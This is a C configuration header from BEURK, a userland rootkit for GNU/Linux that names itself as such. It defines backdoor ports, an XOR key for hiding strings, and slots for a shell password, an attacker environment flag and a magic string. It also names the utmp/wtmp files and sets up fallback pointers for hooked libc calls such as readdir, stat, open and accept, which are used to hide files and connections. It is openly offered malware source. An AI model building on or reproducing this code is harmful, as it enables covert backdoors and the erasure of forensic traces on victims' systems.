/*
 * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
 * Copyright (C) 2015  unix-thrust
 *
 * This file is part of BEURK.
 *
 * BEURK is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * BEURK is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
 */

#pragma once

#ifndef _CONFIG_H_
# define _CONFIG_H_

# include <stdlib.h>

/* common macros from beurk config file */
#define HIGH_BACKDOOR_PORT (64840)
#define DEBUG_LEVEL (1)
#define LOW_BACKDOOR_PORT (64830)
#define MAX_LEN (4125)
#define XOR_KEY (0xfe)


/* store hidden (XORed) literals */
# define NUM_LITERALS (38)
# define MAX_LITERAL_SIZE (81)
extern char __hidden_literals[NUM_LITERALS][MAX_LITERAL_SIZE];

/* store real function pointers (hooks fallbacks) */
# define NUM_HOOKS (19)
ssize_t (*__non_hooked_symbols[NUM_HOOKS])();

/* hidden literals and function pointers */
#define INSTALL_DIR ((char * const)(__hidden_literals[0]))
#define _ENV_XTERM ((char * const)(__hidden_literals[1]))
#define _ENV_IS_ATTACKER ((char * const)(__hidden_literals[2]))
#define SHELL_PASSWORD ((char * const)(__hidden_literals[3]))
#define SCANF_FMT ((char * const)(__hidden_literals[4]))
#define MAGIC_STRING ((char * const)(__hidden_literals[5]))
#define PAM_USER ((char * const)(__hidden_literals[6]))
#define _WTMP_FILE ((char * const)(__hidden_literals[7]))
#define SHELL_MOTD ((char * const)(__hidden_literals[8]))
#define _ENV_NO_HISTFILE ((char * const)(__hidden_literals[9]))
#define PROC_NET_TCP ((char * const)(__hidden_literals[10]))
#define DEBUG_FILE ((char * const)(__hidden_literals[11]))
#define _UTMP_FILE ((char * const)(__hidden_literals[12]))
#define SHELL_TYPE ((char * const)(__hidden_literals[13]))
#define LIBRARY_NAME ((char * const)(__hidden_literals[14]))
#define PROC_PATH ((char * const)(__hidden_literals[15]))
#define HIDDEN_ENV_VAR ((char * const)(__hidden_literals[16]))
#define ENV_LINE ((char * const)(__hidden_literals[17]))
#define PROC_NET_TCP6 ((char * const)(__hidden_literals[18]))
#define REAL_ACCEPT(args...) ((int)((__non_hooked_symbols[0])(args)))
#define REAL_ACCESS(args...) ((int)((__non_hooked_symbols[1])(args)))
#define REAL_RMDIR(args...) ((int)((__non_hooked_symbols[2])(args)))
#define REAL_OPEN(args...) ((int)((__non_hooked_symbols[3])(args)))
#define REAL_READDIR(args...) ((struct dirent *)((__non_hooked_symbols[4])(args)))
#define REAL_READDIR64(args...) ((struct dirent64 *)((__non_hooked_symbols[5])(args)))
#define REAL_STAT(args...) ((int)((__non_hooked_symbols[6])(args)))
#define REAL_STAT64(args...) ((int)((__non_hooked_symbols[7])(args)))
#define REAL___XSTAT(args...) ((int)((__non_hooked_symbols[8])(args)))
#define REAL___XSTAT64(args...) ((int)((__non_hooked_symbols[9])(args)))
#define REAL_LSTAT(args...) ((int)((__non_hooked_symbols[10])(args)))
#define REAL_LSTAT64(args...) ((int)((__non_hooked_symbols[11])(args)))
#define REAL___LXSTAT(args...) ((int)((__non_hooked_symbols[12])(args)))
#define REAL___LXSTAT64(args...) ((int)((__non_hooked_symbols[13])(args)))
#define REAL_FOPEN(args...) ((FILE *)((__non_hooked_symbols[14])(args)))
#define REAL_FOPEN64(args...) ((FILE *)((__non_hooked_symbols[15])(args)))
#define REAL_LINK(args...) ((int)((__non_hooked_symbols[16])(args)))
#define REAL_UNLINK(args...) ((int)((__non_hooked_symbols[17])(args)))
#define REAL_UNLINKAT(args...) ((int)((__non_hooked_symbols[18])(args)))

#endif /* _CONFIG_H_ */
